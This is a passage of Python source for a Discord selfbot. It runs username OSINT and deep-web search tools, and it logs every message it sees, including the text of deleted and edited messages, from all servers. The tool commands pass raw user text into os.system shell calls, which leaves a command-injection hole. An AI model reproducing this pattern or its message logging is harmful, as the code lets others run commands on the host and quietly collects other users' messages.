Please wait this could take about 5 minutes.```""", delete_after=10)
        #await ctx.send(f"{text}")

        msg = await bot.wait_for("message", check=check)
        await ctx.send(f"***{msg.author}*** ```Please wait a special command is initializing...```", delete_after=10)
    
        os.system("cd src/tools/maigret && python3 maigret.py " + text + "> result.txt")
        time.sleep(2)

        await ctx.send(file=discord.File("src/tools/maigret/result.txt"))
        time.sleep(2)
        
@bot.command(aliases=['deepweb', 'Deep', 'DeepWeb', 'Deepweb'])
async def deep(ctx, *, text):
        await ctx.message.delete()
        await ctx.send("""```
DeepWeb Search initializing...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Please wait this could take about 5 minutes.```""", delete_after=10)
        #await ctx.send(f"{text}")

        msg = await bot.wait_for("message", check=check)
        await ctx.send(f"***{msg.author}*** ```Please wait a special command is initializing...```", delete_after=10)
    
        os.system("cd src/tools/thedevilseye && python3 eye -q " + text + "> deepwebsearch.txt")
        time.sleep(2)

        await ctx.send(file=discord.File("src/tools/thedevilseye/deepwebsearch.txt"))
        time.sleep(2)
        



    
##############################################################
################# ERROR HANDLERS AND EVENTS ##################
##############################################################


@bot.event 
async def on_command_error(ctx, error):
    print(f'{Fore.RED}⚠️{Fore.YELLOW} Invalid {Fore.WHITE}command {Fore.RED}{ctx.message.content} {Fore.WHITE}attempted by {Fore.MAGENTA}{ctx.author} {Fore.WHITE}on the server {Fore.CYAN}{ctx.guild.name}')
    print("")


@ban.error
async def ban_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(' ::: ')
    if isinstance(error, commands.MissingPermissions):
        await ctx.send('```You do not have ban_user permission```')


@kick.error
async def kick_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(' ::: ')
    if isinstance(error, commands.MissingPermissions):
        await ctx.send('```You do not have ban_user permission```')

@bot.event
async def on_message_delete(before):
    try:
        print(f"""{Fore.YELLOW}[{Fore.WHITE}LOGGED{Fore.YELLOW}] {Fore.RED}A MESSAGE HAS BEEN DELETED ⚠️ """)
        print(f"{Fore.YELLOW}[{Fore.WHITE}SERVER{Fore.YELLOW}]{Fore.RED} {before.guild.name}")
        print(f"{Fore.YELLOW}[{Fore.WHITE}DELETED IN{Fore.YELLOW}]{Fore.RED} {before.guild.channel}")
        print(f"{Fore.YELLOW}[{Fore.WHITE}DELETED BY{Fore.YELLOW}] {Fore.MAGENTA}{before.author} ")
        print("")
    except AttributeError: # except
        print(f"{Fore.YELLOW}[{Fore.WHITE}DELETED IN{Fore.YELLOW}]{Fore.RED} {before.channel}")
        print(f"{Fore.YELLOW}[{Fore.WHITE}DELETED BY{Fore.YELLOW}] {Fore.MAGENTA}{before.author} ")
        print(f"{Fore.YELLOW}[{Fore.WHITE}MESSAGE REMOVED{Fore.YELLOW}]{Fore.CYAN} {before.content}")
        print("")
        

@bot.event
async def on_message_edit(before, after):
    #async for message in message.channel.history(limit=1):
    try:
    #async for entry in message.guild.audit_logs(limit=1,action=discord.AuditLogAction.message_delete):
        #deleter = entry.user
        print(f"""{Fore.YELLOW}[{Fore.WHITE}LOGGED{Fore.YELLOW}] {Fore.RED}A MESSAGE HAS BEEN CHANGED ⚠️ """)
        print(f"{Fore.YELLOW}[{Fore.WHITE}SERVER{Fore.YELLOW}]{Fore.RED} {before.guild.name}")
        print(f"{Fore.YELLOW}[{Fore.WHITE}EDITED IN{Fore.YELLOW}]{Fore.RED} {before.channel}")
        print(f"{Fore.YELLOW}[{Fore.WHITE}EDITED BY{Fore.YELLOW}] {Fore.MAGENTA}{before.author} ")
        print("")
    except AttributeError: # except
        print(f"{Fore.YELLOW}[{Fore.WHITE}DELETED IN{Fore.YELLOW}]{Fore.RED} {before.channel}")
        print(f"{Fore.YELLOW}[{Fore.WHITE}DELETED BY{Fore.YELLOW}] {Fore.MAGENTA}{before.author} ")
        print(f"{Fore.YELLOW}[{Fore.WHITE}ORIGINAL MESSAGE{Fore.YELLOW}]{Fore.CYAN} {before.content}")
        print(f"{Fore.YELLOW}[{Fore.WHITE}EDITED MESSAGE{Fore.YELLOW}]{Fore.CYAN} {after.content}")
        print("")


@bot.event
async def on_message(message: discord.Message):
    async for message in message.channel.history(limit=1):
        try:
            if message.author.bot:
                return
            print(f"{Fore.YELLOW}[{Fore.GREEN}LOGGED{Fore.YELLOW}] {Fore.WHITE}{message.created_at} {Fore.GREEN}UTC")
            print(f"{Fore.YELLOW}[{Fore.GREEN}SERVER{Fore.YELLOW}]{Fore.RED} {message.guild.name}")
            print(f"{Fore.YELLOW}[{Fore.GREEN}CHANNEL{Fore.YELLOW}]{Fore.RED} {message.channel}")
            print(f"{Fore.YELLOW}[{Fore.GREEN}USER{Fore.YELLOW}] {Fore.MAGENTA}{message.author} ")
            print(f"{Fore.YELLOW}[{Fore.GREEN}SENT{Fore.YELLOW}]{Fore.CYAN} {message.content}")
            print(f'''    
    {Fore.YELLOW}📣 {Fore.RED}Categories{Fore.YELLOW}: {Fore.WHITE}{len(message.guild.categories)}
         {Fore.YELLOW}🔊 {Fore.RED}voice{Fore.YELLOW}: {Fore.WHITE}{len(message.guild.voice_channels)}
          {Fore.YELLOW}💬 {Fore.RED}text{Fore.YELLOW}: {Fore.WHITE}{len(message.guild.text_channels)}''')
            print("")
            await bot.process_commands(message)
            
        except AttributeError: # except
            print(f"{Fore.YELLOW}[{Fore.GREEN}CHANNEL{Fore.YELLOW}]{Fore.RED} {message.channel}")
            print(f"{Fore.YELLOW}[{Fore.GREEN}USER{Fore.YELLOW}] {Fore.MAGENTA}{message.author} ")
            print(f"{Fore.YELLOW}[{Fore.GREEN}SENT{Fore.YELLOW}]{Fore.CYAN} {message.content}")
            print("")


@bot.event
async def on_member_leave(member):
    print("member has left a server.")

#####################
####### TOKEN #######
#####################

bot.run("TOKEN GOES HERE !", bot=False)     
